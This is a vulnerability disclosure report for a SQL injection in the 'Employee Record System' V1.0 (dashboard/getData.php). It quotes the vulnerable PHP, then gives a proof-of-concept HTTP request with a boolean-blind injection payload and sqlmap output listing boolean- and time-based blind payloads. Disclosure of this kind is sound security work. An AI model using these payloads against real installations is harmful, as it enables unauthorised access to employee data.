# NAME OF AFFECTED PRODUCT(S)

Employee Record System

# VERSION(S)

V1.0

# submitter

Thir0th

# Vulnerable File

dashboard/getData.php

Prerequisite: You need to log in first

# Software Link

https://download.code-projects.org/details/09cc7d20-04c1-42c5-8941-407d139ce7cc

# Vulnerability Type

Sql Injection

# describe

in dashboard/getData.php

~~~
if($action == "currentemployees"){
        $start = !empty($_POST['page'])?$_POST['page']:0;        

        //set conditions for search
        $whereSQL = $orderSQL = '';
        $keywords = $_POST['keywords'];
        $sortBy = $_POST['sortBy'];
        if(!empty($keywords)){
            $whereSQL = "WHERE (`middle_name` LIKE '%".$keywords."%' OR `last_name` LIKE '%".$keywords."%' OR `first_name` LIKE '%".$keywords."%') AND `status` = 'employee'";
        } else {
            $whereSQL = "WHERE status = 'employee'";
        }
        if(!empty($sortBy)){
            $orderSQL = " ORDER BY id ".$sortBy;
        }else{
            $orderSQL = " ORDER BY id ASC ";
        }
~~~

We can control the keyword parameter. The SQL statement has no protective measures, and we can perform Boolean blind injection by constructing a payload.

# POC

~~~
POST /es/dashboard/getData.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 50
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/es/dashboard/
Cookie: PHPSESSID=aaaofpnr75u0conks7f3h9h741
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

page=0&keywords=1;' AND EXTRACTVALUE(1104,CASE WHEN (1104=1104) THEN 1104 ELSE 0x3A END)-- XDQe&sortBy=ASC&action=allemployee
~~~

# Exploit

```
sqlmap -r SQL.TXT --dbs

sqlmap identified the following injection point(s) with a total of 3814 HTTP(s) requests:
---
Parameter: keywords (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: page=0&keywords=1;' AND EXTRACTVALUE(1104,CASE WHEN (1104=1104) THEN 1104 ELSE 0x3A END)-- XDQe&sortBy=ASC&action=allemployee

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=0&keywords=1;' AND (SELECT 7398 FROM (SELECT(SLEEP(5)))rOhN)-- ZNhJ&sortBy=ASC&action=allemployee
---
[10:54:57] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.5.9, Apache 2.4.39
back-end DBMS: MySQL >= 5.0.12
[10:54:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.11.1'

[*] ending @ 10:54:57 /2025-05-04/
```
